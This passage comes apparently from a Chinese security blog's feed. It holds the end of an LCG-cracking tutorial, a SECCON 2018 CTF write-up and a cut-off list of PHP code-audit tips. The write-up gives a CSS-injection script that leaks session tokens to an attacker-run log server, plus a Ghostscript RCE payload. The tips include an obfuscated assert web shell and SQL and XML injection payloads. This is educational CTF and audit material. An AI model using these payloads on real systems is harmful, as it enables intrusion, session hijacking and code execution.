LCG生成的初值和后面生成的两个值</div><div class="line">s0 = 6473702802409947663</div><div class="line">s1 = 6562621845583276653</div><div class="line">s2 = 4483807506768649573</div></pre></td></tr></table></figure><p>解决办法很简单，想想怎么解线性方程组就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">s_1 = s0*m + c  (mod n)</div><div class="line">s_2 = s1*m + c  (mod n)</div><div class="line"></div><div class="line">s_2 - s_1 = s1*m - s0*m  (mod n)</div><div class="line">s_2 - s_1 = m*(s1 - s0)  (mod n)</div><div class="line">m = (s_2 - s_1)/(s_1 - s_0)  (mod n)</div></pre></td></tr></table></figure><p>此种类型Python攻击代码如下所示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">def crack_unknown_multiplier(states, modulus):</div><div class="line">    multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus</div><div class="line">    return crack_unknown_increment(states, modulus, multiplier)</div><div class="line"></div><div class="line">print crack_unknown_multiplier([6473702802409947663, 6562621845583276653, 4483807506768649573], 9223372036854775783)</div></pre></td></tr></table></figure><p>这个算法中应用到了求模，所以我们就需要逆推。详情参考: <a href="https://en.wikibooks.org/wiki/Algorithm_Implementation/Mathematics/Extended_Euclidean_algorithm#Python" target="_blank" rel="external">Recursive algorithm</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">def egcd(a, b):</div><div class="line">    if a == 0:</div><div class="line">        return (b, 0, 1)</div><div class="line">    else:</div><div class="line">        g, x, y = egcd(b % a, a)</div><div class="line">        return (g, y - (b // a) * x, x)</div><div class="line"></div><div class="line">def modinv(b, n):</div><div class="line">    g, x, _ = egcd(b, n)</div><div class="line">    if g == 1:</div><div class="line">        return x % n</div></pre></td></tr></table></figure><h3 id="4-增量，乘数和模数均未知"><a href="#4-增量，乘数和模数均未知" class="headerlink" title="4.增量，乘数和模数均未知"></a>4.增量，乘数和模数均未知</h3><p>现在内部状态基本是都不知道了，但是我们知道初值和随后LCG产生的连续的几个值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">m = # unknown</div><div class="line">c = # unknown</div><div class="line">n = # unknown</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">s0 = 2818206783446335158</div><div class="line">s1 = 3026581076925130250</div><div class="line">s2 = 136214319011561377</div><div class="line">s3 = 359019108775045580</div><div class="line">s4 = 2386075359657550866</div><div class="line">s5 = 1705259547463444505</div><div class="line">s6 = 2102452637059633432</div></pre></td></tr></table></figure><p>这次用线性方程式不好解决的了，因为对于每一个方程，我们是不知道前一个模数，因此我们将形成的每个方程都会引入新的未知量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">s1 = s0*m + c  (mod n)</div><div class="line">s2 = s1*m + c  (mod n)</div><div class="line">s3 = s2*m + c  (mod n)</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">s1 - (s0*m + c) = k_1 * n</div><div class="line">s2 - (s1*m + c) = k_2 * n</div><div class="line">s3 - (s2*m + c) = k_3 * n</div></pre></td></tr></table></figure><p>这就相当于六个未知数和三个方程。所以线性方程组是不可能行得通的了，但是数论里面有一条很有用:如果有几个随机数分别乘以n，那么这几个数的欧几里德算法(gcd)就很可能等于n。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">In [944]: n = 123456789</div><div class="line"></div><div class="line">In [945]: reduce(gcd, [randint(1, 1000000)*n, randint(1, 1000000)*n, randint(1, 1000000)*n])</div><div class="line">Out[945]: 123456789</div></pre></td></tr></table></figure><p>某些取模运算是会等于0的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">X = 0 (mod n)</div></pre></td></tr></table></figure><p>然后，根据定义，这相当于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">X = k*n</div></pre></td></tr></table></figure><p>所以这种X != 0但是X = 0 (mod n)的情况就很有趣。我们只需要取几个这样的值进行gcd运算，我们就可以解出n的值。这种是在模数未知的情况下十分常用的方法。</p><p>我们在此引入一个序列 – T(n) = S(n+1) - S(n):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">t0 = s1 - s0</div><div class="line">t1 = s2 - s1 = (s1*m + c) - (s0*m + c) = m*(s1 - s0) = m*t0 (mod n)</div><div class="line">t2 = s3 - s2 = (s2*m + c) - (s1*m + c) = m*(s2 - s1) = m*t1 (mod n)</div><div class="line">t3 = s4 - s3 = (s3*m + c) - (s2*m + c) = m*(s3 - s2) = m*t2 (mod n)</div></pre></td></tr></table></figure><p>之后我们就可以得到我们想要的效果了:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">t2*t0 - t1*t1 = (m*m*t0 * t0) - (m*t0 * m*t0) = 0 (mod n)</div></pre></td></tr></table></figure><p>然后我们就可以生成几个这样模是0的值，进而利用我们上文讲述的技巧，此种类型Python攻击代码如下所示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">def crack_unknown_modulus(states):</div><div class="line">    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]</div><div class="line">    zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]</div><div class="line">    modulus = abs(reduce(gcd, zeroes))</div><div class="line">    return crack_unknown_multiplier(states, modulus)</div><div class="line"></div><div class="line">print crack_unknown_modulus([2818206783446335158, 3026581076925130250,</div><div class="line">    136214319011561377, 359019108775045580, 2386075359657550866, 1705259547463444505])</div></pre></td></tr></table></figure><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>此处我们简述了对LCG的攻击方式，这种方式刚在P.W.N CTF中出现过，具体的题目以及解答可以参考我的下一篇文章–《P.W.N. CTF》中的LCG and the X题目解析。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator" target="_blank" rel="external">Cryptographically secure pseudorandom number generator</a></p><p><a href="https://en.wikipedia.org/wiki/Lenstra%E2%80%93Lenstra%E2%80%93Lov%C3%A1sz_lattice_basis_reduction_algorithm" target="_blank" rel="external">Lenstra–Lenstra–Lovász lattice basis reduction algorithm</a></p><p><a href="https://tailcall.net/blog/cracking-randomness-lcgs/" target="_blank" rel="external">Cracking RNGs: Linear Congruential Generators</a></p><p><a href="https://en.wikibooks.org/wiki/Algorithm_Implementation/Mathematics/Extended_Euclidean_algorithm#Python" target="_blank" rel="external">Algorithm Implementation/Mathematics/Extended Euclidean algorithm</a></p><p><a href="https://zh.wikipedia.org/wiki/%E7%B7%9A%E6%80%A7%E5%90%8C%E9%A4%98%E6%96%B9%E6%B3%95" target="_blank" rel="external">线性同余方法</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>SECCON 2018 Qualis GhostKingdom</title>
      <link href="/2018/10/29/SECCON-2018-Qualis-GhostKingdom/"/>
      <url>/2018/10/29/SECCON-2018-Qualis-GhostKingdom/</url>
      <content type="html"><![CDATA[<h3 id="0x00-问题分析"><a href="#0x00-问题分析" class="headerlink" title="0x00 问题分析"></a>0x00 问题分析</h3><p>题目链接:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ghostkingdom.pwn.seccon.jp/FLAG/</div></pre></td></tr></table></figure><p>访问链接后的提示如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG is somewhere in this folder.   GO TO TOP</div></pre></td></tr></table></figure><p>首先是一个登录界面:</p><p><img src="https://i.loli.net/2018/10/29/5bd6e42077582.png" alt="屏幕快照 2018-10-29 下午6.41.59.png"></p><p>一通操作后发现没有注入，所以跟着逻辑注册登录继续往下看。</p><p>登录后发现侧面有三个功能，但是上传功能被禁止了，标识只有从本地登录才可以使用。尝试修改xxf等方式并没有成功，所以猜测可能是cookie认证问题？</p><p><img src="https://i.loli.net/2018/10/29/5bd6e489ec36b.png" alt="屏幕快照 2018-10-29 下午6.44.14.png"></p><p>但或者上传处不是关键点，先从上面两个功能开始测试。首先测试<code>Message to admin</code>，刚开始猜测可能此处会不会有一个xss bot，打个cookie回来。虽然这个输入框也不存在xss，也没有bot周期性地戳一下，但是在burp抓包中分析到一个css参数可控。联想到可能是CSS 注入读数据这个点，但是我还缺少一个从本地戳戳戳的bot！</p><p><img src="https://i.loli.net/2018/10/29/5bd6e6960b699.png" alt="屏幕快照 2018-10-29 下午6.50.11.png"></p><p><img src="https://i.loli.net/2018/10/29/5bd6e6675902f.png" alt="屏幕快照 2018-10-29 下午6.51.21.png"></p><p>此处我们decode一下这个base64可以看到是控制此处的输出样式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> zeroyu@zeros  ~/Desktop  echo -n &quot;c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9&quot; | base64 -D</div><div class="line">span&#123;background-color:red;color:yellow&#125;</div></pre></td></tr></table></figure><p>点击send to admin之后我看到一个csrf参数(有用？)</p><p><img src="https://i.loli.net/2018/10/29/5bd6e7a284b0f.png" alt="屏幕快照 2018-10-28 下午10.36.50.png"></p><p>好像无法但从这一个点入手，所以我决定看看<code>Take a screenshot</code>。</p><p><img src="https://i.loli.net/2018/10/29/5bd719ee71628.png" alt="屏幕快照 2018-10-29 下午10.31.41.png"></p><p>很明显是一个ssrf,不过file等协议都被限制了，302跳转好像也没开。虽然限制了127等，但是我们可以通过访问<code>http://0/</code>绕过，结果还是有惊喜的。</p><p><img src="https://i.loli.net/2018/10/29/5bd71b0ff2538.png" alt="屏幕快照 2018-10-29 下午10.36.37.png"></p><p>PS:扫描过程中发现了一个有趣的东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ghostkingdom.pwn.seccon.jp/ghostMagick.cgi</div></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/29/5bd722370feba.png" alt="屏幕快照 2018-10-29 下午11.07.14.png"></p><p><strong>小结:</strong></p><p>本来我以为这题是三个点分别突破都可以获取flag，但现在看来不行，真是继承了KeigoYAMAZAKI一贯的出题风格，要综合以上信息，构造利用链来读取flag</p><h3 id="0x01-解题步骤"><a href="#0x01-解题步骤" class="headerlink" title="0x01 解题步骤"></a>0x01 解题步骤</h3><p>首先<code>Take a screenshot</code>处的ssrf可以让我们从<code>local network</code>那里进行登录，登录之后可以操作<code>Upload image</code>。</p><p><img src="https://i.loli.net/2018/10/29/5bd71fe91e67e.png" alt="屏幕快照 2018-10-28 下午10.32.30.png"></p><p>但是仅通过这个有限制的ssrf无法进一步利用了。所以换一个角度考虑，如果我们能够从<code>local network</code>获取<code>CGISESSID</code>在<code>from internet</code>进行登录就可以使用<code>Upload image</code>功能了呢？</p><p>有了这个思路接下来就是获取<code>CGISESSID</code>了，联想到<code>Message to admin</code>还有一个css inject可以用来读取数据，所以就可以ssrf+css inject联合来获取<code>CGISESSID</code>。</p><p>此处可以参考: <a href="https://curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html" target="_blank" rel="external">Reading Data via CSS Injection</a></p><p>服务器上使用php开个服务器来记录数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -S 0.0.0.0:2333</div></pre></td></tr></table></figure></p><p>对应的目录下可以放置如下log.php来帮助记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">date_default_timezone_set(&apos;Asia/Shanghai&apos;);</div><div class="line">$ip       = $_SERVER[&quot;REMOTE_ADDR&quot;]; //记录访问者的ip</div><div class="line">$filename = $_SERVER[&apos;PHP_SELF&apos;];//访问者要访问的文件名</div><div class="line">$parameter   = $_SERVER[&quot;QUERY_STRING&quot;]; //访问者要请求的参数</div><div class="line">$time     =   date(&apos;Y-m-d H:i:s&apos;,time()); //访问时间</div><div class="line">$logadd = &apos;来访时间：&apos;.$time.&apos;--&gt;&apos;.&apos;访问链接：&apos;.&apos;http://&apos;.$ip.$filename.&apos;?&apos;.$parameter.&quot;\r\n&quot;;</div><div class="line">// log记录</div><div class="line">$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);</div><div class="line">fwrite($fh, $logadd);</div><div class="line">fclose($fh);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p>利用脚本如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">import base64</div><div class="line">CHARLIST = &quot;0123456789&quot; + &quot;abcdef&quot;</div><div class="line">URL = &quot;http://0/?msg=master&amp;action=msgadm2&amp;css=&quot;</div><div class="line">#</div><div class="line">known = &quot;bcc703c0693e6eff894ede&quot;</div><div class="line">buf = &quot;&quot;</div><div class="line">for char in CHARLIST:</div><div class="line">    buf += &quot;&quot;&quot;input[name=&quot;csrf&quot;][value^=&quot;&#123;&#125;&quot;] &#123;&#123;</div><div class="line">background: url(http://your server ip/log.php/&#123;&#125;);</div><div class="line">&#125;&#125;&quot;&quot;&quot;.format(known+char,known+char)</div><div class="line"></div><div class="line">print(URL + base64.b64encode(buf.encode(&apos;utf-8&apos;)).decode(&apos;utf-8&apos;))</div></pre></td></tr></table></figure></p><p>最终可以获取<code>CGISESSID</code>的值<br><img src="https://i.loli.net/2018/10/29/5bd7217a4e6c3.png" alt="屏幕快照 2018-10-29 下午11.04.08.png"></p><p>之后在浏览器中设置上我们获得的<code>CGISESSID</code>，就可以使用<code>Upload image</code>功能了。</p><p><img src="https://i.loli.net/2018/10/29/5bd722a10d369.png" alt="屏幕快照 2018-10-28 下午11.41.21.png"></p><p>测试一下<br><img src="https://i.loli.net/2018/10/29/5bd722f902495.png" alt="屏幕快照 2018-10-29 下午11.10.10.png"></p><p><img src="https://i.loli.net/2018/10/29/5bd722f8ee474.png" alt="屏幕快照 2018-10-29 下午11.10.37.png"></p><p>发现有个<code>Convert to GIF format</code>结合之前我们发现的<code>ghostMagick.cgi</code>很容易想到Ghostscript的rce漏洞。我们将以下代码保存为jpg，上传可以得flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">%!PS</div><div class="line">userdict /setpagedevice undef</div><div class="line">legal</div><div class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</div><div class="line">legal</div><div class="line">mark /OutputFile (%pipe%cat /var/www/html/FLAG/FLAGflagF1A8.txt) currentdevice putdeviceprops</div></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/29/5bd723bdf3a02.png" alt="屏幕快照 2018-10-29 上午12.03.49.png"></p><p><code>SECCON{CSSinjection+GhostScript/ImageMagickRCE}</code></p><h3 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h3><p><a href="https://graneed.hatenablog.com/entry/2018/10/28/150722" target="_blank" rel="external">https://graneed.hatenablog.com/entry/2018/10/28/150722</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>PHP代码审计中的一些Tips</title>
      <link href="/2018/10/13/php-audit-tips/"/>
      <url>/2018/10/13/php-audit-tips/</url>
      <content type="html"><![CDATA[<h4 id="1-eregi"><a href="#1-eregi" class="headerlink" title="1.eregi"></a>1.eregi</h4><p>此函数可以被%00截断</p><p>比如下面这个例子，可以使用$b=”%001111”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//%00好像算一个字节</div><div class="line">if(strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</div><div class="line">&#123;</div><div class="line">    require(&quot;f4l2a3g.txt&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>此外，如果传入数组，函数会报错并返回NULL。</p><h4 id="2-assert"><a href="#2-assert" class="headerlink" title="2.assert"></a>2.assert</h4><p>PHP中的assert可以用来执行PHP函数，进而进行getshell等操作，比如我们利用如下代码进行目录扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">$poc = &quot;a#s#s#e#r#t&quot;;</div><div class="line">$poc_1 = explode(&quot;#&quot;, $poc);$poc_2 = $poc_1[0] . $poc_1[1] . $poc_1[2] . $poc_1[3] . $poc_1[4] . $poc_1[5];</div><div class="line">$poc_2($_GET[&apos;s&apos;])</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>payload <code>s=print_r(scandir(&#39;./&#39;));</code></p><h4 id="3-md5-amp-sha1"><a href="#3-md5-amp-sha1" class="headerlink" title="3.md5&amp;sha1"></a>3.md5&amp;sha1</h4><p>PHP中的md5和sha1函数存在两个问题，第一是他们处理数组都返回null；第二在弱类型条件下他们会认为如下的返回值相同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">QNKCDZO</div><div class="line">240610708</div><div class="line">s878926199a</div><div class="line">s155964671a</div><div class="line">s214587387a</div><div class="line">s214587387a</div><div class="line"> sha1(str)</div><div class="line">sha1(&apos;aaroZmOk&apos;)  </div><div class="line">sha1(&apos;aaK1STfY&apos;)</div><div class="line">sha1(&apos;aaO8zKZF&apos;)</div><div class="line">sha1(&apos;aa3OFF9m&apos;)</div></pre></td></tr></table></figure><p>注意：如果使用了md5并且是强相等，那么找到数据对应md5相同的值即可，在此给出一组某强网杯使用过的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</div><div class="line">$Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</div><div class="line">#008ee33a9d58b51cfeb425b0959121c9</div></pre></td></tr></table></figure><p>此外我们观察定义可以得到另外一点，通过设置raw_output参数的值为true，我们可以达到一个\，从而进行sql注入</p><blockquote><p>string md5 ( string $str [, bool $raw_output = false ] )</p><p>str<br>原始字符串。</p><p>raw_output<br>如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">php &gt; var_dump(md5(128,true));</div><div class="line">string(16) &quot;v�an���l���q��\&quot;</div><div class="line"></div><div class="line">//可以看到字符串ffifdyop被md5后会产生&apos;or&apos;，从而可以产生万能密码进行登录</div><div class="line">php &gt; echo md5(&quot;ffifdyop&quot;,true);</div><div class="line">&apos;or&apos;6�]��!r,��b</div><div class="line"></div><div class="line">php &gt; echo md5(&quot;129581926211651571912466741651878684928&quot;,true);</div><div class="line">�T0D��o#��&apos;or&apos;8</div><div class="line"></div><div class="line">content: 129581926211651571912466741651878684928</div><div class="line">count:   18933549</div><div class="line">hex:     06da5430449f8f6f23dfc1276f722738</div><div class="line">raw:     ?T0D??o#??&apos;or&apos;8.N=?</div></pre></td></tr></table></figure><p>参考: <a href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes" target="_blank" rel="external">SQL injection with raw MD5 hashes</a></p><h4 id="4-strcmp"><a href="#4-strcmp" class="headerlink" title="4.strcmp"></a>4.strcmp</h4><p>注：5.3之前版本的php存在如下问题</p><p>当这个函数接受到了不符合的类型，这个函数将发生错误并返回0，因而可以使用数组绕过验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$flag = &quot;flag&#123;xxxxx&#125;&quot;;</div><div class="line">if (isset($_GET[&apos;a&apos;])) &#123;</div><div class="line">if (strcmp($_GET[&apos;a&apos;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</div><div class="line">//比较两个字符串（区分大小写）</div><div class="line">die(&apos;Flag: &apos;.$flag);</div><div class="line">else</div><div class="line">print &apos;No&apos;;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><h4 id="5-ereg"><a href="#5-ereg" class="headerlink" title="5.ereg"></a>5.ereg</h4><p>ereg()函数只能处理字符，如果传入数组将返回null</p><h4 id="6-strpos"><a href="#6-strpos" class="headerlink" title="6.strpos"></a>6.strpos</h4><p>strpos()的参数不能够是数组，所以处理数组返回的是null</p><p>strpos()与PHP的自动类型转换结合也会出在哪问题</p><p>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">var_dump(strpos(&apos;abcd&apos;,&apos;a&apos;));       # 0</div><div class="line">var_dump(strpos(&apos;abcd&apos;,&apos;x&apos;));       # false</div></pre></td></tr></table></figure><p>并且由于PHP的自动类型转换的关系，0和false是相等的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var_dump(0==false);         # true</div></pre></td></tr></table></figure><p>例题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">class Login &#123;</div><div class="line">    public function __construct($user, $pass) &#123;</div><div class="line">        $this-&gt;loginViaXml($user, $pass);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public function loginViaXml($user, $pass) &#123;</div><div class="line">        if (</div><div class="line">            (!strpos($user, &apos;&lt;&apos;) || !strpos($user, &apos;&gt;&apos;)) &amp;&amp;</div><div class="line">            (!strpos($pass, &apos;&lt;&apos;) || !strpos($pass, &apos;&gt;&apos;))</div><div class="line">        ) &#123;</div><div class="line">            $format = &apos;&lt;xml&gt;&lt;user=&quot;%s&quot;/&gt;&lt;pass=&quot;%s&quot;/&gt;&lt;/xml&gt;&apos;;</div><div class="line">            $xml = sprintf($format, $user, $pass);</div><div class="line">            $xmlElement = new SimpleXMLElement($xml);</div><div class="line">            // Perform the actual login.</div><div class="line">            $this-&gt;login($xmlElement);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">new Login($_POST[&apos;username&apos;], $_POST[&apos;password&apos;]);</div></pre></td></tr></table></figure><p>传入的username和password的首位字符是&lt;或者是&gt;就可以绕过限制，那么最后的pyaload就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;password=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;</div></pre></td></tr></table></figure><p>最终传入到$this-&gt;login($xmlElement)的$xmlElement值是<code>&lt;xml&gt;&lt;user=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;pass=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;/xml&gt;</code>这样就可以进行注入了。</p><h4 id="7-is-numeric"><a href="#7-is-numeric" class="headerlink" title="7.is_numeric"></a>7.is_numeric</h4><p>is_numeric()函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。</p><p>此外，is_numeric()函数在判断是否是数字时会忽略字符串开头的’ ‘、’\t’、’\n’、’\r’、’\v’、’\f’。而’.’可以出现在任意位置，E、e能出现在参数中间，仍可以被判断为数字。也就是说is_numeric(“\r\n\t 0.1e2”) &gt;&gt; TRUE</p><h4 id="8-ord"><a href="#8-ord" class="headerlink" title="8.ord"></a>8.ord</h4><p>ord()函数返回字符串的首个字符的 ASCII 值</p><p>例如下面这道题目，我们可以用16进制绕过限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">error_reporting(0);</div><div class="line">function noother_says_correct($temp)</div><div class="line">&#123;</div><div class="line">$flag = &apos;flag&#123;test&#125;&apos;;</div><div class="line">$one = ord(&apos;1&apos;); //ord — 返回字符的 ASCII 码值</div><div class="line">$nine = ord(&apos;9&apos;); //ord — 返回字符的 ASCII 码值</div><div class="line">$number = &apos;3735929054&apos;;</div><div class="line">// Check all the input characters!</div><div class="line">for ($i = 0; $i &lt; strlen($number); $i++)</div><div class="line">&#123;</div><div class="line">// Disallow all the digits!</div><div class="line">$digit = ord($temp&#123;$i&#125;);</div><div class="line">if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</div><div class="line">&#123;</div><div class="line">// Aha, digit not allowed!</div><div class="line">return &quot;flase&quot;;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">if($number == $temp)</div><div class="line">return $flag;</div><div class="line">&#125;</div><div class="line">$temp = $_GET[&apos;password&apos;];</div><div class="line">echo noother_says_correct($temp);</div><div class="line">?&gt;</div></pre></td></tr></table></figure><h4 id="9-科学计数法"><a href="#9-科学计数法" class="headerlink" title="9.科学计数法"></a>9.科学计数法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999</div><div class="line"></div><div class="line">payload==&gt;1e9</div></pre></td></tr></table></figure><h4 id="10-in-array"><a 